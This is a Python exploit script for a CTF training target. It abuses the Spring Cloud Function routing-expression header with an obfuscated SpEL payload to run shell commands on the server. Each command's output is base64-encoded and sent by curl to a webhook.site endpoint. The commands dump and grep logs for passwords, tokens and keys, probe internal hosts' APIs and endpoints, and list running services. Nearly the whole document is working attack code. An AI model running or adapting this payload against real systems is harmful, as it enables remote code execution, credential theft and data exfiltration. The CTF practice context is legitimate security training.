#!/usr/bin/env python3
"""
CTF Chile - Investigar bootstrap.log y documentación Swagger
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Investigando bootstrap.log y documentación...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:40} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Examinar bootstrap.log en detalle...")

# Examinar el archivo bootstrap.log encontrado
probe("bootstrap_log_full", "cat /var/log/bootstrap.log 2>/dev/null")
probe("bootstrap_log_grep_creds", "grep -i -E '(password|secret|token|key|credential|auth)' /var/log/bootstrap.log 2>/dev/null")
probe("bootstrap_log_grep_api", "grep -i -E '(api|http|curl|endpoint|service)' /var/log/bootstrap.log 2>/dev/null")

print("[*] FASE 2: Buscar todos los archivos de log...")

# Buscar otros logs que podrían tener información
probe("all_logs", "find /var/log -name '*.log' -type f 2>/dev/null | head -10")
probe("recent_logs", "find /var/log -name '*.log' -type f -mtime -1 2>/dev/null | head -5 | xargs ls -la")

print("[*] FASE 3: Intentar obtener openapi.json usando diferentes métodos...")

# Ya que los /docs funcionan, tal vez openapi.json funcione con métodos específicos
hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    host_safe = host.replace(".", "_")

    # Diferentes formas de acceder a openapi.json
    probe(f"openapi_wget_{host_safe}", f"timeout 10 wget -q -O - http://{host}:8000/openapi.json 2>/dev/null")
    probe(f"openapi_direct_{host_safe}", f"curl -s -A 'Mozilla/5.0' http://{host}:8000/openapi.json 2>/dev/null")
    probe(f"openapi_referer_{host_safe}", f"curl -s -H 'Referer: http://{host}:8000/docs' http://{host}:8000/openapi.json 2>/dev/null")

print("[*] FASE 4: Intentar extraer información de Swagger UI...")

# Extraer el HTML de /docs para ver si contiene información hardcodeada
for host in hosts:
    host_safe = host.replace(".", "_")
    probe(f"docs_html_{host_safe}", f"curl -s http://{host}:8000/docs | grep -o 'url[^,]*' | head -5")
    probe(f"docs_scripts_{host_safe}", f"curl -s http://{host}:8000/docs | grep -o 'http[^\"']*' | head -5")

print("[*] FASE 5: Probar endpoints descubiertos por Swagger...")

# Si Swagger está configurado, podría haber endpoints que aún no hemos probado
swagger_common_endpoints = [
    "/api/v1/execute", "/v1/execute", "/api/execute",
    "/admin/execute", "/internal/execute", "/system/execute",
    "/vault/execute", "/bank/execute", "/secure/execute"
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for endpoint in swagger_common_endpoints[:4]:  # Solo las primeras 4
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"swagger_ep_{host_safe}{endpoint_safe}", f"curl -s -I http://{host}:8000{endpoint} 2>/dev/null | head -2")

print("[*] FASE 6: Buscar archivos de aplicación FastAPI...")

# Buscar archivos Python que podrían revelar la estructura de la API
probe("python_files", "find / -name '*.py' -type f 2>/dev/null | grep -v proc | head -10")
probe("fastapi_files", "find / -name '*fastapi*' -o -name '*uvicorn*' 2>/dev/null | head -5")

print("[*] FASE 7: Intentar comunicación de regreso hacia nuestro container...")

# Ver si las APIs pueden hacer llamadas de regreso a nosotros
our_ip = "10.109.220.4"  # Nuestro IP en la red bridge

for host in hosts:
    host_safe = host.replace(".", "_")
    # POST con callback URL
    callback_payload = f'{{"callback_url": "http://{our_ip}:8080/result"}}'
    probe(f"callback_{host_safe}", f"curl -s -X POST -H 'Content-Type: application/json' -d '{callback_payload}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 8: Verificar si hay servicios corriendo en nuestro container...")

# Ver qué servicios están corriendo en nuestro propio container
probe("our_services", "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null")
probe("our_processes", "ps aux | head -15")

time.sleep(20)

# Recoger y analizar respuestas
print("\n[*] Analizando investigación...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=40", timeout=20)
data = r.json().get("data", [])

bootstrap_info = []
api_discoveries = []
service_info = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Información del bootstrap.log
            if "bootstrap" in path.lower():
                if len(decoded.strip()) > 20:
                    bootstrap_info.append((path, decoded))
                    print("📋 INFORMACIÓN DE BOOTSTRAP")

            # Descubrimientos de API
            if any(keyword in decoded.lower() for keyword in ["openapi", "swagger", "api", "endpoint"]):
                if len(decoded.strip()) > 30 and "NOT_FOUND" not in decoded:
                    api_discoveries.append((path, decoded))
                    print("🔌 DESCUBRIMIENTO DE API")

            # Información de servicios
            if any(keyword in decoded.lower() for keyword in ["listen", "process", "service", "port"]):
                if len(decoded.strip()) > 30:
                    service_info.append((path, decoded))
                    print("⚙️ INFORMACIÓN DE SERVICIOS")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE INVESTIGACIÓN")
print("="*70)

if bootstrap_info:
    print(f"📋 INFORMACIÓN DE BOOTSTRAP: {len(bootstrap_info)}")
    for path, content in bootstrap_info:
        print(f"    🎯 {path}")
        print(f"       {content[:200]}...")

if api_discoveries:
    print(f"\n🔌 DESCUBRIMIENTOS DE API: {len(api_discoveries)}")
    for path, content in api_discoveries:
        print(f"    📄 {path}")
        print(f"       {content[:150]}...")

if service_info:
    print(f"\n⚙️ INFORMACIÓN DE SERVICIOS: {len(service_info)}")
    for path, content in service_info:
        print(f"    - {path}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 La investigación continúa. Quizás necesitamos un enfoque completamente diferente.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")